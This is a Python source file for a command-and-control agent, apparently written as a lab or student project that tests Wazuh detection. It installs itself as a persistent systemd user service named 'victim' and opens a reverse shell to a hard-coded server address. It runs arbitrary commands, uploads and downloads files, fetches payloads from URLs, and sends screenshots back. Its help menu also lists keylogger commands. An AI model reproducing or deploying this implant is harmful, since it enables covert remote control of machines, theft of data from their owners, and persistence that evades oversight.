"""
 File: agent_c2.py
 Description: file which implement logic for C2 agent
 Designed by: Pasa Larisa

 Module-History:
    3. Implement persistence on machine - service from executable
    2. Added shell() function where are implemented specific action for specific commands
    1. Create connection() function to create reverse-shell tunnel to C2  server
"""
import subprocess
import sys
import base64
import json
import socket
import os
import shutil
import time
import requests
from mss import mss
import threading

admin = ""
SERVER_ADDRESS = "10.177.186.2"
SERVER_PORT = 54321


def persistence():
    """
          Implement persistence on victim machine by creating a user service which always run in background

           Returns:
           None
      """
    if getattr(sys, 'frozen', False):
        script_location = sys.executable
    else:
        script_location = __file__

    location = os.path.expanduser("~/.local/bin/victim")
    service_file = os.path.expanduser("~/.config/systemd/user/victim.service")

    if not os.path.exists(location):
        os.makedirs(os.path.dirname(location), exist_ok=True)
        shutil.copyfile(script_location, location)
        os.chmod(location, 0o755)

    if not os.path.exists(service_file):
        os.makedirs(os.path.dirname(service_file), exist_ok=True)
        with open(service_file, 'w') as f:
            f.write(f"""
                    [Unit]
                    Description=Run victim at startup

                    [Service]
                    ExecStart={location}

                    [Install]
                    WantedBy=default.target
                    """)

        subprocess.call(['systemctl', '--user', 'enable', 'victim.service'])
        subprocess.call(['systemctl', '--user', 'start', 'victim.service'])


def connection():
    """
         Recursive function which continuously try to connect to server

          Returns:
          None
     """
    global s
    while True:
        time.sleep(20)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_ADDRESS, SERVER_PORT))
            shell()
        except Exception as e:
            print("Error when connect > ", e)
            connection()


def reliable_send(data):
    """
        Send encoded result for executed commands

         Returns:
         None
    """
    global s
    try:
        json_data = data.decode()
        json_data = json.dumps(json_data)
        json_data = json_data.encode('utf-8')
        s.send(json_data)
    except Exception as e:
        print(f"[!!]ERROR while sending data to server : {e}")


def reliable_recv():
    """
       Receive encoded command from server to be executed

        Returns:
        None
   """
    global s
    try:
        data = ""
        while True:
            try:
                chunk_recv = s.recv(1024).decode()
                if not chunk_recv or len(chunk_recv) == 0 or chunk_recv == '':
                    break
                data = data + chunk_recv
                return json.loads(data)
            except ValueError:
                continue

    except Exception as e:
        print(f"[!!]ERROR while receiving data to server : {e}")
        return None


def download_to_pc_from_url(url):
    """
      Download data from specific url on victim machine.

       Returns:
       None
    """
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def get_from_url(command):
    """
       Call downloading function and send result of success/error to server

         Returns:
         None
    """
    try:
        download_to_pc_from_url(command[4:])
        reliable_send(f"[+] INFO Downloaded file from url {command[4:]}".encode())
    except Exception as e:
        reliable_send(f"[!!] ERROR Downloaded failed file from url:{e}".encode())


def screenshot():
    """
       Take screenshot with current screen of victim - does not work with command-exclusive machine

         Returns:
         filename - image
    """
    with mss() as ss:
        filename = ss.shot(output="monitor-1.png")
        return filename


def handle_screenshot():
    """
       Take screenshot and send to C2 server

         Returns:
            None
    """
    try:
        filename = screenshot()
        with open(filename, "rb") as sc:
            reliable_send(base64.b64encode(sc.read()))
        os.remove(filename)
    except Exception as e:
        error_message = f"[!!] ERROR could not take screenshot: {e}"
        reliable_send(base64.b64encode(error_message.encode()))


def help_menu():
    help_options = '''
                    upload path     --> Upload a File To Target PC
                    download path   --> Download A File From Target PC
                    get url         --> Download A File To Target PC From Any Website
                    start path      --> Start a Program on Target PC
                    screenshot      --> Take A Screenshot Of Target's Monitor
                    check           --> Check For The Administrator Privileges
                    keylog_dump     --> Get victim keyboard activity
                    keylog_start    --> Start keylogger on victim machine
                    q               --> Exit The Reverse Shell
                    '''
    reliable_send(help_options.encode())


def change_directory(command):
    """
           Change manually directory on victim machine

             Returns:
                None
    """
    try:
        parts = command.strip().split()
        new_dir = parts[1]
        os.chdir(new_dir)
        reliable_send(f"[+] INFO Changed directory to {new_dir}".encode())
    except Exception as e:
        reliable_send(f"[!!] ERROR changing directory: {e}".encode())


def upload_file(command):
    """
          Save file from C2 server on victim machine

             Returns:
                None
    """
    try:
        with open(command[7:], "wb") as fin:
            file_data = reliable_recv()
            fin.write(base64.b64decode(file_data))
    except Exception as e:
        reliable_send(f"[!!] ERROR uploading file: {e}".encode())


def download_file(command):
    """
          Save file from victim machine on C2 server

             Returns:
                None
    """
    try:
        with open(command[9:], "rb") as file:
            reliable_send(base64.b64encode(file.read()))
    except Exception as e:
        reliable_send(f"[!!] ERROR downloading file: {e}".encode())

def is_admin():
    """
       Check status of current user

         Returns:
            None
    """
    global admin
    try:
        temp = os.listdir('/root')
    except PermissionError:
        admin = "[!!!] INFO User Privileges!"
    else:
        admin = "[+] INFO Administrator Privileges!"

def check_if_admin():
    """
          Send to server current user's role

            Returns:
               None
   """
    try:
        is_admin()
        reliable_send(admin.encode())
    except Exception as e:
        reliable_send(f"[!!] ERRPR can not perform the check: {e}".encode())

def check_wazuh(command):
    """
         If command received contain "wazuh" sufix, then is for ensure attack prevention on wazuh-agent

           Returns:
              None
   """
    try:
        proc = subprocess.Popen(command[6:],
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        result = stdout + stderr
        reliable_send(result)
    except Exception as e:
        reliable_send(f"[!!] ERROR executing heartbeat: {e}".encode())

def start_application_on_victim(command):
    """
            Function which start different type of application on victim machine

              Returns:
                 None
      """
    try:
        application = command[6:]
        if application.endswith(".txt"):
            subprocess.Popen(["nano", application], shell=False)
        elif application.endswith(".py"):
            subprocess.Popen(["python3", application], shell=False)
        elif application.endswith(".sh"):
            subprocess.Popen(["bash", application], shell=False)
        elif os.access(application, os.X_OK):
            subprocess.Popen([application], shell=False)
        else:
            subprocess.Popen(application, shell=True)

        reliable_send(f"[+] INFO Started {application}!".encode())
    except Exception as e:
        reliable_send(f"[!!!] ERROR Failed To Start {application}: {str(e)}".encode())


def exec_cmd(command):
    """
        General function which create subprocces to execute C2 server's commands

          Returns:
             None
  """
    proc = subprocess.Popen(command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    reliable_send(result)


def shell():
    """
           Function which treat differently commands from server

             Returns:
                None
     """
    global admin
    while True:
        try:
            command = reliable_recv()
            print(command)
            if command == 'q':
                continue

            elif command.strip().startswith("wazuh") and len(command.strip()) > len("wazuh "):
                check_wazuh(command)

            elif command == "exit":
                break

            elif command == "help":
                help_menu()

            elif command.strip().startswith("cd") and len(command.strip()) > 2:
                change_directory(command)

            elif command.strip().startswith("download") and len(command.strip()) > len("download "):
                download_file(command)

            elif command.strip().startswith("upload") and len(command.strip()) > len("upload "):
                upload_file(command)

            elif command.strip().startswith("get") and len(command.strip()) > len("get "):
                get_from_url(command)

            elif command.strip().startswith("screenshot"):
                handle_screenshot()

            elif command.strip().startswith("check"):
                check_if_admin()

            elif command.strip().startswith("start"):
                start_application_on_victim(command)

            else:
                exec_cmd(command)
        except (ConnectionResetError, ConnectionAbortedError):
            connection()


persistence()
connection()
s.close()
